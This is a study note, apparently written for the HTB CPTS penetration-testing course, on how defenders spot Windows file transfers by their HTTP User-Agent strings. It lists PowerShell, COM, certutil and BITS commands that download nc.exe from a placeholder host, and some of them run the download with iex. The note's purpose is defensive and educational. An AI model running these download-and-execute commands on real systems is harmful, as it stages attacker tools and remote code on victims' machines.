### CPTS / HTB Penetration Tester Path <br>
### File Transfers - Detection <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Detection



Defenders catch malicious file transfers two main ways: command-line auditing (PowerShell logging, AMSI, EDR) and HTTP user-agent fingerprinting at the egress proxy. Blacklist-based detection is fragile — case obfuscation breaks it. Whitelisting is hard up-front but robust long-term.

Each Windows download method has a fingerprint user-agent. Defenders can baseline known UAs (browsers, Windows Update, AV signatures) and alert on anything else.

`Invoke-WebRequest` / `Invoke-RestMethod`:

```diff
+ PS> Invoke-WebRequest http://<ip>/nc.exe -OutFile "C:\Users\Public\nc.exe"
+ PS> Invoke-RestMethod http://<ip>/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

	User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0

`WinHttpRequest`:

```diff
+ PS> $h=new-object -com WinHttp.WinHttpRequest.5.1;
+ PS> $h.open('GET','http://<ip>/nc.exe',$false);
+ PS> $h.send();
+ PS> iex $h.ResponseText
```

	User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)

`Msxml2.XMLHTTP`:

```diff
+ PS> $h=New-Object -ComObject Msxml2.XMLHTTP;
+ PS> $h.open('GET','http://<ip>/nc.exe',$false);
+ PS> $h.send();
+ PS> iex $h.responseText
```

	User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)

`certutil`:

```diff
+ C:\> certutil -urlcache -split -f http://<ip>/nc.exe
+ C:\> certutil -verifyctl -split -f http://<ip>/nc.exe
```

	User-Agent: Microsoft-CryptoAPI/10.0

`BITS`:

```diff
+ PS> Import-Module bitstransfer;
+ PS> Start-BitsTransfer 'http://<ip>/nc.exe' $env:temp\t;
```

	User-Agent: Microsoft BITS/7.8

| Method | UA Fingerprint |
|---|---|
| `Invoke-WebRequest` / `Invoke-RestMethod` | `WindowsPowerShell/<version>` |
| `WinHttpRequest` | `Win32; WinHttp.WinHttpRequest.5` |
| `Msxml2.XMLHTTP` | `MSIE 7.0; ...; Trident/7.0` |
| `certutil` | `Microsoft-CryptoAPI/<version>` |
| `BITS` | `Microsoft BITS/<version>` |

Defender takeaways:

- Build a list of known-legit UAs (browsers, Windows Update, AV). Feed into SIEM. Alert on outliers.
- Hunt for scripted UAs in web proxy logs — they're rarely benign on user workstations.
- `useragentstring.com` has a maintained reference DB.
- This is just the surface. EDR with PowerShell ScriptBlock logging + AMSI + ETW gives much deeper coverage.
